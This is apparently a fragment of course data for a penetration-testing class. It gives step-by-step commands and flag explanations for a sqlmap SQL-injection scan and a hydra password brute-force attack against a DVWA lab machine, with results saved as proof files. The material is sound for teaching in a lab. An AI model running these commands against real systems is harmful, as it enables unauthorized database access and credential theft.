    ...
    steps: [
      {
        ...
        commands: [
          ...
          {
            cmd: 'sqlmap -u http://10.10.10.X/DVWA/vulnerabilities/sqli/ --auth-creds=admin:password --dbs | tee ~/team-artifacts/week-3/SQL_Injection_Proof.txt',
            explain: 'Automatically test the DVWA SQL-injection page and, if it works, list the databases — while saving everything to a proof file.',
            flags: [
              { flag: 'sqlmap', meaning: 'A tool that automates finding and exploiting SQL injection.' },
              { flag: '-u <url>', meaning: 'The web page (URL) to test.' },
              { flag: '--auth-creds=admin:password', meaning: 'Log in as admin/password first so the page is reachable.' },
              { flag: '--dbs', meaning: 'If injectable, list the database names.' },
      ...
      },
      {
        ...
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Make the week-3 folder to save your proof into (safe to run again).' },
          {
            cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://10.10.10.X/login.php:username=^USER^&password=^PASS^:S=Welcome | tee ~/team-artifacts/week-3/Brute_Force_Proof.txt',
            explain: 'Try many passwords against the login form until one works, saving the result. The long http-post-form string tells Hydra the page, where to put the username/password, and how to recognise success.',
            flags: [
              { flag: 'hydra', meaning: 'A tool that tries many login guesses quickly.' },
              { flag: '-l admin', meaning: 'The username to try — just "admin" (lowercase L = one login name).' },
              { flag: '-P …/rockyou.txt', meaning: 'A file of passwords to try, one per line (uppercase P = password list).' },
              { flag: 'http-post-form://…', meaning: 'Attack a web login form sent by HTTP POST, at this URL.' },
              { flag: '^USER^ / ^PASS^', meaning: 'Placeholders Hydra swaps in for each username/password guess.' },
              { flag: 'S=Welcome', meaning: 'The word in the response that means "login worked" (S = success marker).' },
              { flag: '| tee …Brute_Force_Proof.txt', meaning: 'Show output and save a copy to your proof file.' },
            ],
          },
        ],
